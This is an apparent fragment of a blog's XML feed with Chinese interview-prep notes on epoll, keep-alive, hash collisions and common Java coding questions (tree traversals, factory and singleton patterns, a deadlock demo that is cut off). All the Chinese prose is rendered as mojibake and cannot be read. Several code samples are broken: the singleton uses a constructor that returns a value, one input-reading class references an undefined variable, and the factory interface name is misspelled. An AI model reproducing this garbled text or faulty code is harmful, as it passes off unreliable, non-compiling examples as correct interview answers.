·ä¼šå¤§å¤§é™ä½å¤„ç†ç¨‹åºæ£€ç´¢è‡ªå·±å…³å¿ƒçš„å°±ç»ªæ–‡ä»¶æè¿°ç¬¦çš„æ•ˆç‡.ã€‚è€Œé‡‡ç”¨EPOLLETè¿™ç§è¾¹æ²¿è§¦å‘æ¨¡å¼çš„è¯ï¼Œå½“è¢«ç›‘æ§çš„æ–‡ä»¶æè¿°ç¬¦ä¸Šæœ‰å¯è¯»å†™äº‹ä»¶å‘ç”Ÿæ—¶ï¼Œepoll_wait()ä¼šé€šçŸ¥å¤„ç†ç¨‹åºå»è¯»å†™ã€‚å¦‚æœè¿™æ¬¡æ²¡æœ‰æŠŠæ•°æ®å…¨éƒ¨è¯»å†™å®Œ(å¦‚è¯»å†™ç¼“å†²åŒºå¤ªå°)ï¼Œé‚£ä¹ˆä¸‹æ¬¡è°ƒç”¨epoll_wait()æ—¶ï¼Œå®ƒä¸ä¼šé€šçŸ¥ä½ ï¼Œä¹Ÿå°±æ˜¯å®ƒåªä¼šé€šçŸ¥ä½ ä¸€æ¬¡ï¼Œç›´åˆ°è¯¥æ–‡ä»¶æè¿°ç¬¦ä¸Šå‡ºç°ç¬¬äºŒæ¬¡å¯è¯»å†™äº‹ä»¶æ‰ä¼šé€šçŸ¥ä½ ï¼ï¼ï¼<strong>è¿™ç§æ¨¡å¼æ¯”æ°´å¹³è§¦å‘æ•ˆç‡é«˜ï¼Œç³»ç»Ÿä¸ä¼šå……æ–¥å¤§é‡ä½ ä¸å…³å¿ƒçš„å°±ç»ªæ–‡ä»¶æè¿°ç¬¦</strong></p><h2><span id="http-keep-aliveä¸tcp-keep-alive">http keep-aliveä¸tcp keep-alive</span></h2><p>é“¾æ¥å»ºç«‹ä¹‹åï¼Œå¦‚æœåº”ç”¨ç¨‹åºæˆ–è€…ä¸Šå±‚åè®®ä¸€ç›´ä¸å‘é€æ•°æ®ï¼Œæˆ–è€…éš”å¾ˆé•¿æ—¶é—´æ‰å‘é€ä¸€æ¬¡æ•°æ®ï¼Œå½“é“¾æ¥å¾ˆä¹…æ²¡æœ‰æ•°æ®æŠ¥æ–‡ä¼ è¾“æ—¶å¦‚ä½•å»ç¡®å®šå¯¹æ–¹è¿˜åœ¨çº¿ï¼Œåˆ°åº•æ˜¯æ‰çº¿äº†è¿˜æ˜¯ç¡®å®æ²¡æœ‰æ•°æ®ä¼ è¾“ï¼Œé“¾æ¥è¿˜éœ€ä¸éœ€è¦ä¿æŒï¼Œè¿™ç§æƒ…å†µåœ¨TCPåè®®è®¾è®¡ä¸­æ˜¯éœ€è¦è€ƒè™‘åˆ°çš„ã€‚</p><p>http keep-aliveä¸tcp keep-aliveï¼Œä¸æ˜¯åŒä¸€å›äº‹ï¼Œæ„å›¾ä¸ä¸€æ ·ã€‚http keep-aliveæ˜¯ä¸ºäº†è®©tcpæ´»å¾—æ›´ä¹…ä¸€ç‚¹ï¼Œä»¥ä¾¿åœ¨åŒä¸€ä¸ªè¿æ¥ä¸Šä¼ é€å¤šä¸ªhttpï¼Œæé«˜socketçš„æ•ˆç‡ã€‚è€Œ<strong>tcp keep-aliveæ˜¯TCPçš„ä¸€ç§æ£€æµ‹TCPè¿æ¥çŠ¶å†µçš„ä¿é²œæœºåˆ¶</strong>ã€‚</p><h2><span id="rediså®ä¹ ç¼“å­˜åŒæ­¥">Rediså®ä¹ ç¼“å­˜åŒæ­¥</span></h2><h1><span id="å®é™…é—®é¢˜">å®é™…é—®é¢˜</span></h1><h2><span id="æ€ä¹ˆè§£å†³bugé—®é¢˜æœ‰ç”¨æ—¥å¿—å—">æ€ä¹ˆè§£å†³bugé—®é¢˜ï¼Œæœ‰ç”¨æ—¥å¿—å—ï¼Ÿ</span></h2><p>ä½¿ç”¨jstacké€šè¿‡pidå»dumpå‡ºå †æ ˆä¿¡æ¯</p><p>ä½¿ç”¨slf4jæ¡†æ¶ï¼Œå†…éƒ¨ä½¿ç”¨logback</p><h1><span id="å…¶ä»–">å…¶ä»–</span></h1><h2><span id="å“ˆå¸Œå†²çªæ³•">å“ˆå¸Œå†²çªæ³•</span></h2><p>â€‹1.å¼€æ”¾åœ°å€æ³•</p><p>ã€€ã€€ã€€æŒ‰é¡ºåºå†³å®šå“ˆå¸Œå€¼æ—¶ï¼Œå¦‚æœæŸæ•°æ®çš„å“ˆå¸Œå€¼å·²ç»å­˜åœ¨ï¼Œåˆ™åœ¨åŸæ¥å“ˆå¸Œå€¼çš„åŸºç¡€ä¸Šå¾€ååŠ ä¸€ä¸ªå•ä½ï¼Œç›´è‡³ä¸å‘ç”Ÿå“ˆå¸Œå†²çªã€‚</p><ol start="2"><li><p>æ‹‰é“¾æ³• </p><p>HashMapçš„æ–¹æ³•</p></li><li><p>å†å“ˆå¸Œæ³•</p><p>å¯¹äºå†²çªçš„å“ˆå¸Œå€¼ä½¿ç”¨å…¶ä»–å“ˆå¸Œæ³•å“ˆå¸Œï¼Œç›´è‡³æ²¡æœ‰å“ˆå¸Œå†²çªã€‚</p></li><li><p>å»ºç«‹å…¬å…±æº¢å‡ºåŒº</p><p>å»ºç«‹å…¬å…±æº¢å‡ºåŒºå­˜å‚¨æ‰€æœ‰å“ˆå¸Œå†²çªçš„æ•°æ®ã€‚</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> é¢ç» </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tencent </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é¢è¯•å¸¸è€ƒç®—æ³•é¢˜</title>
      <link href="/2020/04/14/Exam/"/>
      <url>/2020/04/14/Exam/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>é¢è¯•å¸¸è€ƒçš„coding</p><span id="more"></span><!-- toc --><ul><li><a href="#%E7%89%9B%E5%AE%A2%E7%BD%91%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA">ç‰›å®¢ç½‘è¾“å…¥è¾“å‡º</a></li></ul><ul><li><a href="#%E6%A0%91">æ ‘</a><ul><li><a href="#%E6%A0%91%E7%9A%84%E5%89%8D%E5%BA%8F%E9%81%8D%E5%8E%86-">æ ‘çš„å‰åºéå† -</a></li><li><a href="#%E6%A0%91%E7%9A%84%E4%B8%AD%E5%BA%8F%E9%81%8D%E5%8E%86-">æ ‘çš„ä¸­åºéå† -</a></li><li><a href="#%E6%A0%91%E7%9A%84%E5%90%8E%E5%BA%8F%E9%81%8D%E5%8E%86-">æ ‘çš„ååºéå† -</a></li></ul></li><li><a href="#%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F">è®¾è®¡æ¨¡å¼</a><ul><li><a href="#%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F">å·¥å‚æ¨¡å¼</a></li><li><a href="#%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F">å•ä¾‹æ¨¡å¼</a></li></ul></li><li><a href="#%E7%AE%97%E6%B3%95">ç®—æ³•</a><ul><li><a href="#%E6%AD%BB%E9%94%81">æ­»é”</a><ul><li><a href="#%E4%B8%80%E4%BB%80%E4%B9%88%E6%98%AF%E6%AD%BB%E9%94%81">ä¸€.ä»€ä¹ˆæ˜¯æ­»é”ï¼Ÿ</a></li><li><a href="#%E4%BA%8C%E4%BA%A7%E7%94%9F%E6%AD%BB%E9%94%81%E7%9A%84%E5%9B%9B%E4%B8%AA%E5%BF%85%E8%A6%81%E6%9D%A1%E4%BB%B6">äºŒ.äº§ç”Ÿæ­»é”çš„å››ä¸ªå¿…è¦æ¡ä»¶</a></li><li><a href="#%E4%B8%89%E9%81%BF%E5%85%8D%E6%AD%BB%E9%94%81%E7%9A%84%E6%96%B9%E6%B3%95">ä¸‰.é¿å…æ­»é”çš„æ–¹æ³•</a><ul><li><a href="#1%E7%A0%B4%E5%9D%8F%E8%AF%B7%E6%B1%82%E5%92%8C%E4%BF%9D%E6%8C%81%E6%9D%A1%E4%BB%B6">1.ç ´åâ€œè¯·æ±‚å’Œä¿æŒâ€æ¡ä»¶</a></li><li><a href="#2%E7%A0%B4%E5%9D%8F%E4%B8%8D%E5%8F%AF%E6%8A%A2%E5%8D%A0%E6%9D%A1%E4%BB%B6">2.ç ´åâ€œä¸å¯æŠ¢å â€æ¡ä»¶</a></li><li><a href="#3%E7%A0%B4%E5%9D%8F%E5%BE%AA%E7%8E%AF%E7%AD%89%E5%BE%85%E6%9D%A1%E4%BB%B6">3.ç ´åâ€œå¾ªç¯ç­‰å¾…â€æ¡ä»¶</a></li></ul></li></ul></li><li><a href="#lru">LRU</a></li><li><a href="#%E7%94%9F%E4%BA%A7%E8%80%85%E6%B6%88%E8%B4%B9%E8%80%85">ç”Ÿäº§è€…æ¶ˆè´¹è€…</a></li></ul></li><li><a href="#%E6%8E%92%E5%BA%8F">æ’åº</a><ul><li><a href="#%E5%BF%AB%E6%8E%92">å¿«æ’ âˆš</a><ul><li><a href="#1-%E6%9C%80%E4%BC%98%E6%83%85%E5%86%B5">1ã€æœ€ä¼˜æƒ…å†µ</a></li><li><a href="#2-%E6%9C%80%E7%B3%9F%E7%B3%95%E6%83%85%E5%86%B5">2ã€æœ€ç³Ÿç³•æƒ…å†µ</a></li></ul></li><li><a href="#%E5%BF%AB%E9%80%9F%E9%80%89%E6%8B%A9">å¿«é€Ÿé€‰æ‹© âˆš</a></li><li><a href="#%E5%A0%86%E6%8E%92">å †æ’</a></li><li><a href="#%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F">å½’å¹¶æ’åº âˆš</a></li></ul></li></ul><!-- tocstop --><h2><span id="ç‰›å®¢ç½‘è¾“å…¥è¾“å‡º">ç‰›å®¢ç½‘è¾“å…¥è¾“å‡º</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è¾“å…¥æè¿°:</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//è¾“å…¥åŒ…æ‹¬2è¡Œï¼š</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//ç¬¬ä¸€è¡Œä¸ºæ•´æ•°n(1 &lt;= n &lt;= 50)ï¼Œå³æŠ¹é™¤ä¸€ä¸ªæ•°ä¹‹åå‰©ä¸‹çš„æ•°å­—ä¸ªæ•°</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//ç¬¬äºŒè¡Œä¸ºnä¸ªæ•´æ•°num[i] (1 &lt;= num[i] &lt;= 1000000000)</span></span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Next</span> &#123;</span><br><span class="line">Â Â  Â <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">Â Â  Â Â Â  Â Scanner sc=<span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">Â Â  Â Â Â  Â <span class="type">int</span> N=sc.nextInt();</span><br><span class="line">Â Â  Â Â Â  Â <span class="type">int</span>[] num = <span class="keyword">new</span> <span class="title class_">int</span>[N];</span><br><span class="line">Â Â  Â Â Â  Â <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line">Â Â  Â Â Â  Â Â Â  Â num[i] = sc.nextInt();</span><br><span class="line">Â Â  Â Â Â  Â &#125;Â Â  Â Â Â  </span><br><span class="line">Â Â  Â &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">Â Â  Â <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">Â Â  Â Â Â  Â <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">Â Â  Â Â Â  Â <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> sc.nextLine();</span><br><span class="line">Â Â  Â Â Â  Â <span class="type">char</span>[] arr = str.toCharArray();</span><br><span class="line">Â  Â &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//è¾“å…¥åŒ…æ‹¬n+1è¡Œï¼š</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//ç¬¬ä¸€è¡Œä¸ºå•è¯ä¸ªæ•°n(1 â‰¤ n â‰¤ 50)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//æ¥ä¸‹æ¥çš„nè¡Œï¼Œæ¯è¡Œä¸€ä¸ªå•è¯word[i]ï¼Œé•¿åº¦length(1 â‰¤ length â‰¤ 50)ã€‚ç”±å°å†™å­—æ¯æ„æˆ</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo1</span> &#123;</span><br><span class="line">Â Â  Â <span class="keyword">private</span> <span class="type">int</span> N;</span><br><span class="line">Â Â  Â <span class="keyword">private</span> String[] arr;</span><br><span class="line">Â Â  Â <span class="keyword">private</span> <span class="type">int</span> count;</span><br><span class="line">Â Â  Â <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">Â Â  Â Â Â  </span><br><span class="line">Â Â  Â Â Â  Â <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">Â Â  Â Â Â  Â N = sc.nextInt();</span><br><span class="line">Â Â  Â Â Â   arr = <span class="keyword">new</span> <span class="title class_">String</span>[demo.N];</span><br><span class="line">Â Â  Â Â Â  Â <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; demo.N; i++) &#123;</span><br><span class="line">Â Â  Â Â Â  Â Â Â  Â <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> sc.next();Â Â  Â Â Â  Â Â Â  </span><br><span class="line">Â Â  Â Â Â  Â &#125;Â Â  Â Â Â </span><br><span class="line">Â Â  Â Â Â  Â sc.close();</span><br><span class="line">Â Â  Â &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1><span id="æ ‘">æ ‘</span></h1><h2><span id="æ ‘çš„å‰åºéå†-">æ ‘çš„å‰åºéå† -</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">preorderTraversal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">       List&lt;Integer&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">       <span class="keyword">if</span>(root==<span class="literal">null</span>) <span class="keyword">return</span> res;</span><br><span class="line">       Stack&lt;TreeNode&gt; s = <span class="keyword">new</span> <span class="title class_">Stack</span>();</span><br><span class="line">       s.push(root);</span><br><span class="line">       <span class="keyword">while</span>(!s.isEmpty())&#123;</span><br><span class="line">           root=s.pop();</span><br><span class="line">           res.add(root.val);</span><br><span class="line">           <span class="keyword">if</span>(root.right!=<span class="literal">null</span>) s.push(root.right);</span><br><span class="line">           <span class="keyword">if</span>(root.left!=<span class="literal">null</span>) s.push(root.left);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> res;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2><span id="æ ‘çš„ä¸­åºéå†-">æ ‘çš„ä¸­åºéå† -</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">inorderTraversal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">null</span>) <span class="keyword">return</span> res;</span><br><span class="line">        Stack&lt;TreeNode&gt; s = <span class="keyword">new</span> <span class="title class_">Stack</span>();       </span><br><span class="line">        <span class="keyword">while</span>(!s.isEmpty()||root!=<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(root!=<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">while</span>(root!=<span class="literal">null</span>)&#123;</span><br><span class="line">                    s.push(root);</span><br><span class="line">                    root=root.left;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                root = s.pop();</span><br><span class="line">                res.add(root.val);</span><br><span class="line">                root=root.right;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="æ ‘çš„ååºéå†-">æ ‘çš„ååºéå† -</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">postorderTraversal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">null</span>) <span class="keyword">return</span> res;</span><br><span class="line">        Stack&lt;TreeNode&gt; s1 = <span class="keyword">new</span> <span class="title class_">Stack</span>();</span><br><span class="line">        Stack&lt;TreeNode&gt; s2 = <span class="keyword">new</span> <span class="title class_">Stack</span>();</span><br><span class="line">        s1.push(root);</span><br><span class="line">        <span class="keyword">while</span>(!s1.isEmpty())&#123;</span><br><span class="line">            <span class="type">TreeNode</span> <span class="variable">tmp</span> <span class="operator">=</span> s1.pop();</span><br><span class="line">            s2.push(tmp);</span><br><span class="line">            <span class="keyword">if</span>(tmp.left!=<span class="literal">null</span>) s1.push(tmp.left);</span><br><span class="line">            <span class="keyword">if</span>(tmp.right!=<span class="literal">null</span>) s1.push(tmp.right);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(!s2.isEmpty()) res.add(s2.pop().val);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1><span id="è®¾è®¡æ¨¡å¼">è®¾è®¡æ¨¡å¼</span></h1><h2><span id="å·¥å‚æ¨¡å¼">å·¥å‚æ¨¡å¼</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">FoodFactroy</span>&#123;</span><br><span class="line">    Food <span class="title function_">makeFood</span><span class="params">(String name)</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ChineseFoodFactory</span> <span class="keyword">implements</span> <span class="title class_">FoodFactory</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> Food <span class="title function_">makeFood</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(name.equals(<span class="string">&quot;A&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ChineseFoodA</span>();</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> (name.equals(<span class="string">&quot;B&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ChineseFoodB</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AmericanFoodFactory</span> <span class="keyword">implements</span> <span class="title class_">FoodFactory</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Food <span class="title function_">makeFood</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (name.equals(<span class="string">&quot;A&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">AmericanFoodA</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (name.equals(<span class="string">&quot;B&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">AmericanFoodB</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">APP</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// å…ˆé€‰æ‹©ä¸€ä¸ªå…·ä½“çš„å·¥å‚</span></span><br><span class="line">        <span class="type">FoodFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChineseFoodFactory</span>();</span><br><span class="line">        <span class="comment">// ç”±ç¬¬ä¸€æ­¥çš„å·¥å‚äº§ç”Ÿå…·ä½“çš„å¯¹è±¡ï¼Œä¸åŒçš„å·¥å‚é€ å‡ºä¸ä¸€æ ·çš„å¯¹è±¡</span></span><br><span class="line">        <span class="type">Food</span> <span class="variable">food</span> <span class="operator">=</span> factory.makeFood(<span class="string">&quot;A&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="å•ä¾‹æ¨¡å¼">å•ä¾‹æ¨¡å¼</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Singleton</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> Singleton instance=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Singleton</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Singleton</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(instance==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">synchronized</span>(Singleton.class)&#123;</span><br><span class="line">                <span class="keyword">if</span>(instance==<span class="literal">null</span>)&#123;</span><br><span class="line">                    instance = <span class="keyword">new</span> <span class="title class_">Singleton</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ª if è¯­å¥ç”¨æ¥é¿å… uniqueInstance å·²ç»è¢«å®ä¾‹åŒ–ä¹‹åçš„åŠ é”æ“ä½œï¼Œè€Œç¬¬äºŒä¸ª if è¯­å¥è¿›è¡Œäº†åŠ é”ï¼Œæ‰€ä»¥åªèƒ½æœ‰ä¸€ä¸ªçº¿ç¨‹è¿›å…¥ï¼Œå°±ä¸ä¼šå‡ºç° uniqueInstance &#x3D;&#x3D; null æ—¶ä¸¤ä¸ªçº¿ç¨‹åŒæ—¶è¿›è¡Œå®ä¾‹åŒ–æ“ä½œã€‚</p><p>çš„ï¼Œ uniqueInstance &#x3D; new Singleton(); è¿™æ®µä»£ç å…¶å®æ˜¯åˆ†ä¸ºä¸‰æ­¥æ‰§è¡Œï¼š</p><ol><li>ä¸º uniqueInstance åˆ†é…å†…å­˜ç©ºé—´</li><li>åˆå§‹åŒ– uniqueInstance</li><li>å°† uniqueInstance æŒ‡å‘åˆ†é…çš„å†…å­˜åœ°å€</li></ol><p>ä½¿ç”¨ volatile å¯ä»¥ç¦æ­¢ JVM çš„æŒ‡ä»¤é‡æ’ï¼Œä¿è¯åœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸‹ä¹Ÿèƒ½æ­£å¸¸è¿è¡Œã€‚</p><h1><span id="ç®—æ³•">ç®—æ³•</span></h1><h2><span id="æ­»é”">æ­»é”</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeadLock</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> Object lock1=<span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> Object lock2=<span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">A</span>()).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">B</span>()).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">A</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">while</span>(<span 